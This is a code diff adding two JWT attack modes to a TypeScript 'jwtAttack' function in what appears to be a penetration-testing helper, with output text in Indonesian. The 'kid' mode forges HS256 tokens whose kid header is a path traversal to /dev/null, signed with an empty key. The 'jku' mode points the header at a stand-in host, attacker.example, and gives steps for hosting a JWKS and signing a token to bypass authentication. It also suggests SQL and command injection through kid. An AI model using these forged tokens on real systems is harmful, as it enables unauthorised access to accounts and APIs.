@@ -77,6 +77,44 @@ export function jwtAttack(opts: { action: string; token?: string; secret?: strin
     return `🎫 JWT HS256 alg-confusion (HMAC dgn public key):\n• ${t}\n\nCocok kalau server pakai RS256 tapi salah verifikasi sebagai HS256.`;
   }
 
+  if (action === "kid") {
+    // kid-injection (CWE-347 family): if the server looks up the key file named
+    // by `kid` without normalizing the path, a traversal kid points the lookup
+    // at a known/empty file (dev null) whose content an attacker knows.
+    const claims2 = { ...payload, ...(opts.claims ? mergeClaims({}, opts.claims) : {}) };
+    const kidPayloads = ["../../dev/null", "/dev/null", "../../../dev/null"];
+    const tokens = kidPayloads.map((kid) => {
+      const h = b64u({ alg: "HS256", typ: "JWT", kid });
+      const p = b64u(claims2);
+      return `${h}.${p}.${hmac("", `${h}.${p}`)}`;
+    });
+    const notes = [
+      "🎫 JWT kid-injection (kid → path traversal ke /dev/null, HMAC dgn key kosong):",
+      ...tokens.map((t) => `• ${t}`),
+      "",
+      "Server rentan bila: kid dipakai utk lookup file key tanpa normalisasi + /dev/null dibaca sbg key kosong. Uji kirim sebagai Bearer; 200 pada endpoint ber-otorisasi = auth bypass.",
+      "Variasi: kid → SQLi (kid=' UNION SELECT key--), kid → command injection — uji manual sesuai konteks.",
+    ];
+    return notes.join("\n");
+  }
+
+  if (action === "jku") {
+    // jku header injection: point jku/jwks_uri at an attacker-controlled JWKS.
+    // Mia renders the forged token + the JWKS the attacker must serve; the
+    // request itself stays out of band (no weaponization inside this tool).
+    const claims2 = { ...payload, ...(opts.claims ? mergeClaims({}, opts.claims) : {}) };
+    const h = b64u({ alg: "RS256", typ: "JWT", jku: (opts.publicKey || "").trim() || "https://attacker.example/.well-known/jwks.json" });
+    const p = b64u(claims2);
+    const unsigned = `${h}.${p}.`;
+    return [
+      `🎫 JWT jku-injection (header jku → ${(opts.publicKey || "").trim() || "https://attacker.example/.well-known/jwks.json"}):`,
+      `• unsigned-token: ${unsigned}`,
+      "",
+      "Langkah: (1) buat keypair RS256, host JWKS publik di URL jku; (2) sign token di atas dgn private key-mu; (3) kirim — server fetch JWKS dari URL-mu dan menerima token.",
+      "Server rentan bila JWKS tidak di-cache/allowlist. OWASP API & JWT best practice: allowlist jku ke host sendiri.",
+    ].join("\n");
+  }
+
   if (action === "crack") {
     if (parts.length !== 3) return "Error: crack butuh token JWT 3 bagian.";
     const header = dec(parts[0]) as { alg?: string } | null;
@@ -98,5 +136,5 @@ export function jwtAttack(opts: { action: string; token?: string; secret?: strin
 
   // default: decode/summary
   const header = parts[0] ? dec(parts[0]) : null;
-  return `🎫 JWT decode:\nHeader: ${JSON.stringify(header)}\nPayload: ${JSON.stringify(payload)}\n\nAksi tersedia: none | hs256 | confusion | crack.`;
+  return `🎫 JWT decode:\nHeader: ${JSON.stringify(header)}\nPayload: ${JSON.stringify(payload)}\n\nAksi tersedia: none | hs256 | confusion | crack | kid | jku.`;
 }
